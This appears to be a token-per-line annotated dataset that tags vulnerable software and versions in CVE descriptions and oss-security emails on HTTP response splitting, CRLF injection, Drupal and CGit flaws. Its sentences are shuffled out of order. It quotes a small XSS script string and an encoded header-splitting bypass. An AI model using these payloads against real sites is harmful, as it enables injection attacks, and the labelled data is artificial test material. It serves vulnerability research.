Promise O O
Technology O O
WebPam O O
Pro-E O O
devices O O
allow O O
remote O O
attackers O O
to O O
conduct O O
XSS O O
, O O
HTTP O O
Response O O
Splitting O O
, O O
and O O
CRLF O O
Injection O O
attacks O O
via O O
JavaScript O O
code O O
in O O
a O O
PHPSESSID O O
cookie O O
. O O

Cisco O O
Bug O O
IDs O O
: O O
CSCvf16705 O O
. O O

An O O
attacker O O
could O O
exploit O O
this O O
vulnerability O O
by O O
injecting O O
malicious O O
HTTP O O
headers O O
, O O
controlling O O
the O O
response O O
body O O
, O O
or O O
splitting O O
the O O
response O O
into O O
multiple O O
responses O O
. O O

An O O
exploit O O
could O O
allow O O
the O O
attacker O O
to O O
perform O O
cross-site O O
scripting O O
attacks O O
, O O
cross-user O O
defacement O O
, O O
web O O
cache O O
poisoning O O
, O O
and O O
similar O O
exploits O O
. O O

The O O
vulnerability O O
is O O
due O O
to O O
the O O
failure O O
of O O
the O O
application O O
or O O
its O O
environment O O
to O O
properly O O
sanitize O O
input O O
values O O
. O O

A O O
vulnerability O O
in O O
the O O
Cisco O O
Email O O
Security O O
Appliance O O
( O O
ESA O O
) O O
could O O
allow O O
an O O
unauthenticated O O
, O O
remote O O
attacker O O
to O O
conduct O O
a O O
HTTP O O
response O O
splitting O O
attack O O
. O O

setup/controllers/language.php O O
in O O
MODX S-vulnerable_software pair_0
Revolution S-vulnerable_software pair_0
2.5.4-pl S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
does O O
not O O
properly O O
constrain O O
the O O
language O O
parameter O O
, O O
which O O
allows O O
remote O O
attackers O O
to O O
conduct O O
Cookie-Bombing O O
attacks O O
and O O
cause O O
a O O
denial O O
of O O
service O O
( O O
cookie O O
quota O O
exhaustion O O
) O O
, O O
or O O
conduct O O
HTTP O O
Response O O
Splitting O O
attacks O O
with O O
resultant O O
XSS O O
, O O
via O O
an O O
invalid O O
parameter O O
value O O
. O O

IBM O O
X-Force O O
ID O O
: O O
129578 O O
. O O

IBM S-vulnerable_software pair_0
WebSphere S-vulnerable_software pair_0
Application S-vulnerable_software pair_0
Server S-vulnerable_software pair_0
7.0 S-vulnerable_version pair_0
, O O
8.0 S-vulnerable_version pair_0
, O O
8.5 S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
9.0 S-vulnerable_version pair_0
is O O
vulnerable O O
to O O
HTTP O O
response O O
splitting O O
attacks O O
. O O

A O O
remote O O
attacker O O
could O O
exploit O O
this O O
vulnerability O O
using O O
specially-crafted O O
URL O O
to O O
cause O O
the O O
server O O
to O O
return O O
a O O
split O O
response O O
, O O
once O O
the O O
URL O O
is O O
clicked O O
. O O

This O O
would O O
allow O O
the O O
attacker O O
to O O
perform O O
further O O
attacks O O
, O O
such O O
as O O
Web O O
cache O O
poisoning O O
, O O
cross-site O O
scripting O O
, O O
and O O
possibly O O
obtain O O
sensitive O O
information O O
. O O

IBM O O
X-Force O O
ID O O
: O O
125152 O O
. O O

IBM S-vulnerable_software pair_0
Maximo S-vulnerable_software pair_0
Asset S-vulnerable_software pair_0
Management S-vulnerable_software pair_0
7.5 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
7.6 S-vulnerable_version pair_0
is O O
vulnerable O O
to O O
HTTP O O
response O O
splitting O O
attacks O O
. O O

IBM S-vulnerable_software pair_0
Security S-vulnerable_software pair_0
Guardium S-vulnerable_software pair_0
10.0 S-vulnerable_version pair_0
is O O
vulnerable O O
to O O
HTTP O O
response O O
splitting O O
attacks O O
. O O

IBM O O
X-Force O O
ID O O
: O O
124737 O O
. O O

Accepting O O
these O O
different O O
behaviors O O
represented O O
a O O
security O O
concern O O
when O O
httpd O O
participates O O
in O O
any O O
chain O O
of O O
proxies O O
or O O
interacts O O
with O O
back-end O O
application O O
servers O O
, O O
either O O
through O O
mod_proxy O O
or O O
using O O
conventional O O
CGI O O
mechanisms O O
, O O
and O O
may O O
result O O
in O O
request O O
smuggling O O
, O O
response O O
splitting O O
and O O
cache O O
pollution O O
. O O

Apache S-vulnerable_software pair_0
HTTP S-vulnerable_software pair_0
Server S-vulnerable_software pair_0
, O O
in O O
all O O
releases O O
prior S-vulnerable_version pair_0
to S-vulnerable_version pair_0
2.2.32 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
2.4.25 S-vulnerable_version pair_0
, O O
was O O
liberal O O
in O O
the O O
whitespace O O
accepted O O
from O O
requests O O
and O O
sent O O
in O O
response O O
lines O O
and O O
headers O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
Huawei S-vulnerable_software pair_0
FusionAccess S-vulnerable_software pair_0
before S-vulnerable_version pair_0
V100R006C00 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
unspecified O O
vectors O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
the O O
ServerResponse O O
writeHead O O
function O O
in O O
Node.js S-vulnerable_software pair_0
0.10.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
0.10.47 S-vulnerable_version pair_0
, O O
0.12.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
0.12.16 S-vulnerable_version pair_0
, O O
4.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
4.6.0 S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
6.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
6.7.0 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
the O O
reason O O
argument O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
the O O
Undertow O O
web O O
server O O
in O O
WildFly S-vulnerable_software pair_0
10.0.0 S-vulnerable_version pair_0
, O O
as O O
used O O
in O O
Red S-vulnerable_software pair_1
Hat S-vulnerable_software pair_1
JBoss S-vulnerable_software pair_1
Enterprise S-vulnerable_software pair_1
Application S-vulnerable_software pair_1
Platform S-vulnerable_software pair_1
( O O
EAP S-vulnerable_software pair_1
) O O
7.x S-vulnerable_version pair_1
before S-vulnerable_version pair_1
7.0.2 S-vulnerable_version pair_1
, O O
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
via O O
unspecified O O
vectors O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
the O O
drupal_set_header O O
function O O
in O O
Drupal S-vulnerable_software pair_0
6.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
6.38 S-vulnerable_version pair_0
, O O
when O O
used O O
with O O
PHP S-vulnerable_software pair_1
before S-vulnerable_version pair_1
5.1.2 S-vulnerable_version pair_1
, O O
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
by O O
leveraging O O
a O O
module O O
that O O
allows O O
user-submitted O O
data O O
to O O
appear O O
in O O
HTTP O O
headers O O
. O O

Subject O O
: O O
CVE O O
requests O O
for O O
Drupal O O
core O O
( O O
SA-CORE-2016-001 O O
) O O

Date O O
: O O
Wed O O
, O O
24 O O
Feb O O
2016 O O
21:35:17 O O
+0100 O O
From O O
: O O
Pere O O
Orga O O
< O O
pere O O
@ O O
... O O
a.cat O O
To O O
: O O
oss-security O O
@ O O
... O O
ts.openwall.com O O
Cc O O
: O O
Drupal O O
Security O O
Team O O
< O O
security O O
@ O O
... O O
pal.org O O

Hi O O
Please O O
can O O
I O O
have O O
CVE O O
IDs O O
assigned O O
to O O
the O O
following O O
Drupal O O
vulnerabilities O O
( O O
see O O
) O O
: O O
File O O
upload O O
access O O
bypass O O
and O O
denial O O
of O O
service O O
( O O
File O O
module O O
- O O
Drupal O O
7 O O
and O O
8 O O
) O O
Brute O O
force O O
amplification O O
attacks O O
via O O
XML-RPC O O
( O O
XML-RPC O O
server O O
- O O
Drupal O O
6 O O
and O O
7 O O
) O O
Open O O
redirect O O
via O O
path O O
manipulation O O
( O O
Base O O
system O O
- O O
Drupal O O
6 O O
, O O
7 O O
and O O
8 O O
) O O
Form O O
API O O
ignores O O
access O O
restrictions O O
on O O
submit O O
buttons O O
( O O
Form O O
API O O
- O O
Drupal O O
6 O O
) O O
HTTP O O
header O O
injection O O
using O O
line O O
breaks O O
( O O
Base O O
system O O
- O O
Drupal O O
6 O O
) O O
Open O O
redirect O O
via O O
double-encoded O O
destination O O
parameter O O
( O O
Base O O
system O O
- O O
Drupal O O
6 O O
) O O
Reflected O O
file O O
download O O
vulnerability O O
( O O
System O O
module O O
- O O
Drupal O O
6 O O
and O O
7 O O
) O O
Saving O O
user O O
accounts O O
can O O
sometimes O O
grant O O
the O O
user O O
all O O
roles O O
( O O
User O O
module O O
- O O
Drupal O O
6 O O
and O O
7 O O
) O O
Email O O
address O O
can O O
be O O
matched O O
to O O
an O O
account O O
( O O
User O O
module O O
- O O
Drupal O O
7 O O
and O O
8 O O
) O O
Session O O
data O O
truncation O O
can O O
lead O O
to O O
unserialization O O
of O O
user O O
provided O O
data O O
( O O
Base O O
system O O
- O O
Drupal O O
6 O O
) O O
And O O
also O O
for O O
the O O
FileField O O
contributed O O
module O O
: O O
FileField O O
- O O
Denial O O
of O O
Service O O
Regards O O
Pere O O
Orga O O
on O O
behalf O O
of O O
the O O
Drupal O O
Security O O
team O O

Use O O
CVE-2016-3170 O O
. O O

This O O
issue O O
is O O
mitigated O O
by O O
the O O
fact O O
that O O
it O O
requires O O
an O O
unusual O O
set O O
of O O
circumstances O O
to O O
exploit O O
and O O
depends O O
on O O
the O O
particular O O
Drupal O O
code O O
that O O
is O O
running O O
on O O
the O O
site O O
. O O

Form O O
API O O
ignores O O
access O O
restrictions O O
on O O
submit O O
buttons O O
( O O
Form O O
API O O
- O O
Drupal O O
6 O O
- O O
Critical O O
) O O
An O O
access O O
bypass O O
vulnerability O O
was O O
found O O
that O O
allows O O
input O O
to O O
be O O
submitted O O
, O O
for O O
example O O
using O O
JavaScript O O
, O O
for O O
form O O
button O O
elements O O
that O O
a O O
user O O
is O O
not O O
supposed O O
to O O
have O O
access O O
to O O
because O O
the O O
button O O
was O O
blocked O O
by O O
setting O O
access O O
to O O
FALSE O O
in O O
the O O
server-side O O
form O O
definition O O
. O O

This O O
vulnerability O O
is O O
mitigated O O
by O O
the O O
fact O O
that O O
it O O
would O O
only O O
occur O O
in O O
combination O O
with O O
custom O O
code O O
, O O
or O O
in O O
certain O O
cases O O
if O O
a O O
user O O
submits O O
a O O
form O O
shown O O
on O O
a O O
404 O O
page O O
with O O
a O O
specially O O
crafted O O
URL O O
. O O

This O O
vulnerability O O
is O O
mitigated O O
by O O
that O O
fact O O
that O O
the O O
attack O O
is O O
not O O
possible O O
for O O
sites O O
running O O
on O O
PHP O O
5.4.7 O O
or O O
greater O O
. O O

This O O
vulnerability O O
is O O
mitigated O O
by O O
the O O
fact O O
that O O
the O O
attacker O O
must O O
have O O
access O O
to O O
submit O O
a O O
form O O
that O O
has O O
such O O
buttons O O
defined O O
for O O
it O O
( O O
for O O
example O O
, O O
a O O
form O O
that O O
both O O
administrators O O
and O O
non-administrators O O
can O O
access O O
, O O
but O O
where O O
administrators O O
have O O
additional O O
buttons O O
available O O
to O O
them O O
) O O
. O O

Use O O
CVE-2016-3166 O O
. O O

This O O
can O O
lead O O
to O O
Open O O
Redirect O O
vulnerabilities O O
. O O

Use O O
CVE-2016-3168 O O
. O O

This O O
issue O O
is O O
mitigated O O
by O O
the O O
fact O O
that O O
it O O
requires O O
a O O
contributed O O
module O O
to O O
be O O
installed O O
that O O
permits O O
logging O O
in O O
with O O
an O O
email O O
address O O
, O O
and O O
that O O
it O O
is O O
only O O
relevant O O
on O O
sites O O
where O O
usernames O O
are O O
typically O O
chosen O O
to O O
hide O O
the O O
users O O
real-life O O
identities O O
. O O

It O O
is O O
also O O
believed O O
to O O
be O O
mitigated O O
by O O
upgrading O O
to O O
PHP O O
5.4.45 O O
, O O
5.5.29 O O
, O O
5.6.13 O O
, O O
or O O
any O O
higher O O
version O O
. O O

It O O
is O O
additionally O O
mitigated O O
if O O
flood O O
control O O
protection O O
is O O
in O O
place O O
for O O
the O O
method O O
in O O
question O O
. O O

HTTP O O
header O O
injection O O
using O O
line O O
breaks O O
( O O
Base O O
system O O
- O O
Drupal O O
6 O O
- O O
Moderately O O
Critical O O
) O O
A O O
vulnerability O O
in O O
the O O
drupal_set_header O O
( O O
) O O
function O O
allows O O
an O O
HTTP O O
header O O
injection O O
attack O O
to O O
be O O
performed O O
if O O
user-generated O O
content O O
is O O
passed O O
as O O
a O O
header O O
value O O
on O O
sites O O
running O O
PHP S-vulnerable_software pair_0
versions O O
older S-vulnerable_version pair_0
than S-vulnerable_version pair_0
5.1.2 S-vulnerable_version pair_0
. O O

This O O
vulnerability O O
is O O
mitigated O O
by O O
the O O
fact O O
that O O
the O O
attacker O O
must O O
have O O
permission O O
to O O
create O O
content O O
or O O
comment O O
and O O
upload O O
files O O
as O O
part O O
of O O
that O O
process O O
. O O

This O O
issue O O
is O O
mitigated O O
by O O
the O O
fact O O
that O O
it O O
requires O O
contributed O O
or O O
custom O O
code O O
that O O
calls O O
user_save O O
( O O
) O O
with O O
an O O
explicit O O
category O O
and O O
code O O
that O O
loads O O
all O O
roles O O
into O O
the O O
array O O
. O O

Use O O
CVE-2016-3162 O O
. O O

This O O
vulnerability O O
is O O
mitigated O O
by O O
the O O
fact O O
that O O
most O O
hosts O O
have O O
newer O O
versions O O
of O O
PHP O O
installed O O
, O O
and O O
that O O
it O O
requires O O
a O O
module O O
to O O
be O O
installed O O
on O O
the O O
site O O
that O O
allows O O
user-submitted O O
data O O
to O O
appear O O
in O O
HTTP O O
headers O O
. O O

Date O O
: O O
Tue O O
, O O
15 O O
Mar O O
2016 O O
19:02:25 O O
-0400 O O
( O O
EDT O O
) O O
From O O
: O O
cve-assign O O
@ O O
... O O
re.org O O
To O O
: O O
pere O O
@ O O
... O O
a.cat O O
Cc O O
: O O
cve-assign O O
@ O O
... O O
re.org O O
, O O
oss-security O O
@ O O
... O O
ts.openwall.com O O
, O O
security O O
@ O O
... O O
pal.org O O

Use O O
CVE-2016-3171 O O
. O O

- O O
CVE O O
Assignment O O
Team O O
M/S O O
M300 O O
, O O
202 O O
Burlington O O
Road O O
, O O
Bedford O O
, O O
MA O O
01730 O O
USA O O
[ O O
A O O
PGP O O
key O O
is O O
available O O
for O O
encrypted O O
communications O O
at O O
] O O
BEGIN O O
PGP O O
SIGNATURE O O
Version O O
: O O
GnuPG O O
v1 O O
iQIcBAEBCAAGBQJW6JQLAAoJEL54rhJi8gl5ySQQAI4bneFzYhM+2x9p8M9zDwF0 O O
qZbMerp4yXeB+w4ejBBUv73k03xXveRwOabDiT0N4Rub/njlUUhmqtOLHuOZ21WU O O
wYPGYxZHEVLmsiDCYu6W55aE114CywC+uWEay6o6Nk55y5EGRrZzwQjYPwSJdbl+ O O
/D4ArePHQkw5+mclilaFVKvhd8t01AVaH8x5cyfGYTZVJRjL6O6032fEbTgGcz6c O O
mEZ2cpHZYsOAvn5I0i0SKq5xTK3UK+mzt23n8toP2k2E9bFOjqIej49hQMsIKF0O O O
ixZn1J08J5stumLUDPMcu1L1kwr5/6+C24f5Um67q0zlL5W6jshpUUzXXe4nxBom O O
vr9cC2hqMk1tkjBmKvylS7BLk5VblL8rSsUjZ6UxbL+gvusdblPnTpzvw1ldlG61 O O
fgp5e27yOFYKuOrd6/OO79zmJFGWo+mRweumJOZpKdP8H4x58IMF5eZSzFhVSuzS O O
EVKFKOHVwPVF1nQ3j81KyDxe4vNtCCjIy6eKJyctkHMn8Q21VlkTGjvDVcO8qfOA O O
oUV/JKn2ad/Pl4TN4LDT6KDss6zHCM+EvlX+mLdy4Oa13rs+N29Ek5VxLGjaEe9p O O
77yXCYPIO64dxUqlU+/bKH3f/fRBDv0fjLt3nWUol0e26RTmAbIn/T6xRdFCB2Qb O O
infW+eF3l8hqc0Y9K27J O O
=f4nY O O
END O O
PGP O O
SIGNATURE O O

For O O
Drupal O O
8 O O
this O O
is O O
a O O
hardening O O
against O O
possible O O
browser O O
flaws O O
handling O O
certain O O
redirect O O
paths O O
. O O

Use O O
CVE-2016-3163 O O
. O O

Use O O
CVE-2016-3164 O O
. O O

Saving O O
user O O
accounts O O
can O O
sometimes O O
grant O O
the O O
user O O
all O O
roles O O
( O O
User O O
module O O
- O O
Drupal O O
6 O O
and O O
7 O O
- O O
Less O O
Critical O O
) O O
Some O O
specific O O
contributed O O
or O O
custom O O
code O O
may O O
call O O
Drupal O O
user_save O O
( O O
) O O
API O O
in O O
a O O
manner O O
different O O
than O O
Drupal O O
core O O
. O O

( O O
This O O
issue O O
has O O
a O O
CVE O O
ID O O
because O O
the O O
Drupal O O
vendor O O
has O O
issued O O
a O O
security O O
advisory O O
. O O

If O O
the O O
content O O
contains O O
line O O
breaks O O
the O O
user O O
may O O
be O O
able O O
to O O
set O O
arbitrary O O
headers O O
of O O
their O O
own O O
choosing O O
. O O

This O O
vulnerability O O
is O O
mitigated O O
by O O
the O O
fact O O
that O O
the O O
victim O O
must O O
be O O
a O O
site O O
administrator O O
and O O
that O O
the O O
full O O
version O O
of O O
the O O
attack O O
only O O
works O O
with O O
certain O O
web O O
browsers O O
. O O

Email O O
address O O
can O O
be O O
matched O O
to O O
an O O
account O O
( O O
User O O
module O O
- O O
Drupal O O
7 O O
and O O
8 O O
- O O
Less O O
Critical O O
) O O
In O O
certain O O
configurations O O
where O O
a O O
user O O
email O O
addresses O O
could O O
be O O
used O O
to O O
log O O
in O O
instead O O
of O O
their O O
username O O
, O O
links O O
to O O
have O O
you O O
forgotten O O
your O O
password O O
could O O
reveal O O
the O O
username O O
associated O O
with O O
a O O
particular O O
email O O
address O O
, O O
leading O O
to O O
an O O
information O O
disclosure O O
vulnerability O O
. O O

There O O
are O O
no O O
such O O
modules O O
in O O
Drupal O O
7 O O
core O O
, O O
but O O
Drupal O O
6 O O
core O O
is O O
vulnerable O O
via O O
the O O
Blog O O
API O O
module O O
. O O

We O O
may O O
be O O
sending O O
a O O
separate O O
reply O O
about O O
the O O
And O O
also O O
for O O
the O O
FileField O O
contributed O O
module O O
part O O
. O O

Use O O
CVE-2016-3167 O O
. O O

Subject O O
: O O
Re O O
: O O
CVE O O
requests O O
for O O
Drupal O O
core O O
( O O
SA-CORE-2016-001 O O
) O O
BEGIN O O
PGP O O
SIGNED O O
MESSAGE O O
Hash O O
: O O
SHA256 O O
File O O
upload O O
access O O
bypass O O
and O O
denial O O
of O O
service O O
( O O
File O O
module O O
- O O
Drupal O O
7 O O
and O O
8 O O
- O O
Moderately O O
Critical O O
) O O
A O O
vulnerability O O
exists O O
in O O
the O O
File O O
module O O
that O O
allows O O
a O O
malicious O O
user O O
to O O
view O O
, O O
delete O O
or O O
substitute O O
a O O
link O O
to O O
a O O
file O O
that O O
the O O
victim O O
has O O
uploaded O O
to O O
a O O
form O O
while O O
the O O
form O O
has O O
not O O
yet O O
been O O
submitted O O
and O O
processed O O
. O O

Use O O
CVE-2016-3169 O O
. O O

Open O O
redirect O O
via O O
path O O
manipulation O O
( O O
Base O O
system O O
- O O
Drupal O O
6 O O
, O O
7 O O
and O O
8 O O
- O O
Moderately O O
Critical O O
) O O
In O O
Drupal S-vulnerable_software pair_0
6 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
7 S-vulnerable_version pair_0
, O O
the O O
current O O
path O O
can O O
be O O
populated O O
with O O
an O O
external O O
URL O O
. O O

This O O
vulnerability O O
is O O
mitigated O O
by O O
the O O
fact O O
that O O
you O O
must O O
have O O
enabled O O
a O O
module O O
that O O
provides O O
an O O
XML-RPC O O
method O O
that O O
is O O
vulnerable O O
to O O
brute-forcing O O
. O O

Depending O O
on O O
the O O
data O O
that O O
has O O
been O O
added O O
to O O
a O O
form O O
or O O
the O O
array O O
prior O O
to O O
saving O O
, O O
this O O
can O O
lead O O
to O O
a O O
user O O
gaining O O
all O O
roles O O
on O O
a O O
site O O
. O O

Use O O
CVE-2016-3165 O O
. O O

Brute O O
force O O
amplification O O
attacks O O
via O O
XML-RPC O O
( O O
XML-RPC O O
server O O
- O O
Drupal O O
6 O O
and O O
7 O O
- O O
Moderately O O
Critical O O
) O O
The O O
XML-RPC O O
system O O
allows O O
a O O
large O O
number O O
of O O
calls O O
to O O
the O O
same O O
method O O
to O O
be O O
made O O
at O O
once O O
, O O
which O O
can O O
be O O
used O O
as O O
an O O
enabling O O
factor O O
in O O
brute O O
force O O
attacks O O
( O O
for O O
example O O
, O O
attempting O O
to O O
determine O O
user O O
passwords O O
by O O
submitting O O
a O O
large O O
number O O
of O O
password O O
variations O O
at O O
once O O
) O O
. O O

If O O
an O O
attacker O O
carries O O
out O O
this O O
attack O O
continuously O O
, O O
all O O
file O O
uploads O O
to O O
a O O
site O O
could O O
be O O
blocked O O
by O O
deleting O O
all O O
temporary O O
files O O
before O O
they O O
can O O
be O O
saved O O
. O O

Subject O O
: O O
Re O O
: O O
CVE O O
requests O O
for O O
Drupal O O
core O O
( O O
SA-CORE-2016-001 O O
) O O

The O O
HTTP O O
header O O
parsing O O
code O O
in O O
Node.js S-vulnerable_software pair_0
0.10.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
0.10.42 S-vulnerable_version pair_0
, O O
0.11.6 S-vulnerable_version pair_0
through S-vulnerable_version pair_0
0.11.16 S-vulnerable_version pair_0
, O O
0.12.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
0.12.10 S-vulnerable_version pair_0
, O O
4.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
4.3.0 S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
5.x S-vulnerable_version pair_0
before S-vulnerable_version pair_0
5.6.0 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
bypass O O
an O O
HTTP O O
response-splitting O O
protection O O
mechanism O O
via O O
UTF-8 O O
encoded O O
Unicode O O
characters O O
in O O
the O O
HTTP O O
header O O
, O O
as O O
demonstrated O O
by O O
% O O
c4 O O
% O O
8d O O
% O O
c4 O O
% O O
8a O O
. O O

CRLF O O
injection O O
vulnerability O O
in O O
the O O
ui-blob O O
handler O O
in O O
CGit S-vulnerable_software pair_0
before S-vulnerable_version pair_0
0.12 S-vulnerable_version pair_0
allows O O
remote O O
attackers O O
to O O
inject O O
arbitrary O O
HTTP O O
headers O O
and O O
conduct O O
HTTP O O
response O O
splitting O O
attacks O O
or O O
cross-site O O
scripting O O
( O O
XSS O O
) O O
attacks O O
via O O
CRLF O O
sequences O O
in O O
the O O
mimetype O O
parameter O O
, O O
as O O
demonstrated O O
by O O
a O O
request O O
to O O
blob/cgit.c O O
. O O

Subject O O
: O O
CVE O O
Request O O
: O O
CGit O O
- O O
Multiple O O
vulnerabilities O O

This O O
has O O
been O O
fixed O O
by O O
adding O O
a O O
configuration O O
option O O
, O O
enable-html-serving O O
, O O
which O O
is O O
by O O
default O O
off O O
: O O
This O O
flag O O
sets O O
anti-sniffing O O
, O O
CSP O O
, O O
and O O
restricts O O
mimetypes O O
to O O
non- O O
application O O
( O O
except O O
for O O
application/pdf O O
and O O
application/octet-stream O O
) O O
and O O
non- O O
text O O
( O O
except O O
for O O
text/plain O O
) O O
. O O

This O O
has O O
been O O
fixed O O
by O O
this O O
commit O O
: O O
A O O
new O O
version O O
containing O O
these O O
security O O
fixes O O
will O O
be O O
published O O
shortly O O
. O O

Thanks O O
, O O
Jason O O

Hi O O
folks O O
, O O
Krzysztof O O
Katowicz-Kowalewski O O
from O O
ESET O O
, O O
Erik O O
Cabetas O O
from O O
Include O O
Security O O
, O O
and O O
myself O O
( O O
Jason O O
Donenfeld O O
) O O
from O O
Edge O O
Security O O
, O O
have O O
found O O
a O O
few O O
vulnerabilities O O
in O O
CGit O O
: O O
1 O O
. O O

While O O
this O O
is O O
ordinarily O O
not O O
a O O
problem O O
for O O
single-use O O
users O O
- O O
and O O
indeed O O
some O O
users O O
rather O O
like O O
being O O
able O O
to O O
serve O O
html O O
from O O
cgit O O
- O O
sites O O
that O O
allow O O
potentially O O
malicious O O
third O O
party O O
users O O
may O O
not O O
find O O
this O O
behavior O O
desirable O O
. O O

Integer O O
Overflow O O
resulting O O
in O O
Buffer O O
Overflow O O
[ O O
Cabetas O O
] O O
ctx.env.content_length O O
is O O
an O O
unsigned O O
int O O
, O O
coming O O
from O O
the O O
CONTENT_LENGTH O O
environment O O
variable O O
, O O
which O O
is O O
parsed O O
by O O
strtoul O O
. O O

This O O
has O O
been O O
fixed O O
by O O
properly O O
escaping O O
filenames O O
in O O
headers O O
: O O
Additionally O O
, O O
while O O
the O O
redirect O O
for O O
the O O
/about O O
- O O
/about O O
page O O
does O O
not O O
appear O O
to O O
be O O
vulnerable O O
due O O
to O O
mitigating O O
conditions O O
, O O
the O O
following O O
commit O O
was O O
made O O
to O O
similarly O O
harden O O
potential O O
injections O O
here O O
: O O
3 O O
. O O

Stored O O
Cross O O
Site O O
Scripting O O
in O O
Git O O
Repo O O
Files O O
[ O O
Katowicz-Kowalewski O O
] O O
A O O
user O O
who O O
has O O
write O O
access O O
to O O
the O O
git O O
repository O O
can O O
add O O
HTML O O
pages O O
and O O
then O O
serve O O
them O O
with O O
an O O
HTML O O
mimetype O O
. O O

Date O O
: O O
Thu O O
, O O
14 O O
Jan O O
2016 O O
15:21:36 O O
+0100 O O
From O O
: O O
Jason O O
A. O O
Donenfeld O O
< O O
Jason O O
@ O O
... O O
c4.com O O
To O O
: O O
cgit O O
@ O O
... O O
ts.zx2c4.com O O
< O O
cgit O O
@ O O
... O O
ts.zx2c4.com O O
> O O
, O O
oss-security O O
< O O
oss-security O O
@ O O
... O O
ts.openwall.com O O
Cc O O
: O O
Daniel O O
Chromek O O
< O O
chromek O O
@ O O
... O O
t.sk O O
> O O
, O O
Krzysztof O O
Katowicz-Kowalewski O O
< O O
krzysztof.kowalewski O O
@ O O
... O O
t.pl O O
> O O
, O O
Erik O O
Cabetas O O
< O O
erik O O
@ O O
... O O
ludesecurity.com O O
> O O
, O O
Konstantin O O
Ryabitsev O O
< O O
mricon O O
@ O O
... O O
nel.org O O

The O O
HTTP/1.1 O O
spec O O
says O O
that O O
any O O
Content-Length O O
greater O O
than O O
or O O
equal O O
to O O
zero O O
is O O
a O O
valid O O
value O O
. O O

Stored O O
Cross O O
Site O O
Scripting O O
& O O
Header O O
Injection O O
in O O
Filename O O
Parameter O O
[ O O
Donenfeld O O
] O O
A O O
user O O
who O O
has O O
write O O
access O O
to O O
the O O
git O O
repository O O
could O O
create O O
filenames O O
containing O O
new O O
lines O O
that O O
would O O
result O O
in O O
that O O
filename O O
, O O
including O O
the O O
newlines O O
, O O
being O O
included O O
in O O
a O O
header O O
, O O
resulting O O
in O O
header O O
injection O O
and O O
eventually O O
XSS O O
. O O

A O O
user O O
could O O
therefore O O
upload O O
pages O O
with O O
malicious O O
javascript O O
executing O O
in O O
the O O
same O O
origin O O
as O O
the O O
cgit O O
web O O
site O O
. O O

Reflected O O
Cross O O
Site O O
Scripting O O
& O O
Header O O
Injection O O
in O O
Mimetype O O
Query O O
String O O
[ O O
Katowicz-Kowalewski O O
] O O
The O O
ui-blob O O
handler O O
accepted O O
a O O
mimetype O O
as O O
a O O
query O O
string O O
and O O
then O O
echoed O O
this O O
string O O
verbatim O O
back O O
. O O

If O O
you O O
have O O
a O O
better O O
idea O O
of O O
what O O
sort O O
of O O
white/black O O
list O O
to O O
use O O
for O O
this O O
, O O
I O O
am O O
open O O
to O O
suggestions O O
. O O

By O O
storing O O
this O O
unsigned O O
int O O
into O O
an O O
int O O
, O O
we O O
potentially O O
overflow O O
it O O
, O O
resulting O O
in O O
the O O
following O O
bounding O O
check O O
failing O O
, O O
leading O O
to O O
a O O
buffer O O
overflow O O
. O O

A O O
malicious O O
user O O
could O O
provide O O
a O O
string O O
like O O
: O O
< O O
script O O
> O O
xss O O
< O O
/script O O
This O O
has O O
been O O
fixed O O
by O O
removing O O
support O O
for O O
the O O
mimetype O O
query O O
string O O
parameter O O
: O O
And O O
then O O
restricting O O
to O O
only O O
generic O O
mimetypes O O
: O O
And O O
finally O O
, O O
just O O
in O O
case O O
, O O
setting O O
the O O
IE O O
anti-sniffing O O
header O O
as O O
well O O
as O O
a O O
restrictive O O
CSP O O
header O O
: O O
2 O O
. O O

However O O
, O O
we O O
typically O O
don O O
t O O
want O O
to O O
have O O
a O O
CVE O O
for O O
a O O
design O O
change O O
that O O
probably O O
breaks O O
a O O
number O O
of O O
existing O O
installations O O
unless O O
reconfigured O O
. O O

This O O
has O O
been O O
fixed O O
by O O
properly O O
escaping O O
filenames O O
in O O
headers O O
: O O
Use O O
CVE-2016-1900 O O
. O O

And O O
then O O
restricting O O
to O O
only O O
generic O O
mimetypes O O
: O O
And O O
finally O O
, O O
just O O
in O O
case O O
, O O
setting O O
the O O
IE O O
anti-sniffing O O
header O O
as O O
well O O
as O O
a O O
restrictive O O
CSP O O
header O O
: O O
There O O
is O O
no O O
CVE O O
ID O O
associated O O
with O O
either O O
of O O
these O O
other O O
changes O O
, O O
which O O
seem O O
to O O
be O O
for O O
defense-in-depth O O
purposes O O
. O O

Subject O O
: O O
Re O O
: O O
CVE O O
Request O O
: O O
CGit O O
- O O
Multiple O O
vulnerabilities O O
BEGIN O O
PGP O O
SIGNED O O
MESSAGE O O
Hash O O
: O O
SHA256 O O
1 O O
. O O

Date O O
: O O
Thu O O
, O O
14 O O
Jan O O
2016 O O
11:55:46 O O
-0500 O O
( O O
EST O O
) O O
From O O
: O O
